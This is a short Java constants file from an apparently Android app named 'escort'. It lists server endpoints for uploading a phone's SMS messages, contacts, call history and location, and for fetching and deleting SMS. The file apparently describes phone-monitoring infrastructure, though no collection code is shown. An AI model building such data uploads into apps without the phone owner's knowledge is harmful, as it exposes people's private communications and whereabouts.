package sumon.com.escort;

public class RequestUrl {

    //private static final String ROOT_URL = "http://192.168.0.102/EscortOperation/";
    private static final String ROOT_URL = "http://android.tech2view.org/EscortOperation/";

    public static final String URL_INSERT_SMS = ROOT_URL + "add_sms.php";
    public static final String URL_INSERT_CONTACTS = ROOT_URL + "add_contact.php";
    public static final String URL_INSERT_CALL_HISTORY = ROOT_URL + "add_call_history.php";
    public static final String URL_INSERT_LOCATION = ROOT_URL + "add_location.php";
    public static final String URL_GET_SMS = ROOT_URL + "get_sms.php";
    public static final String URL_UPDATE_SMS = ROOT_URL + "updateSMS";
    public static final String URL_DELETE_SMS = ROOT_URL + "deleteSMS&id=";

    public static final String GET_METHOD = "GET";
    static final String POST_METHOD = "POST";
}
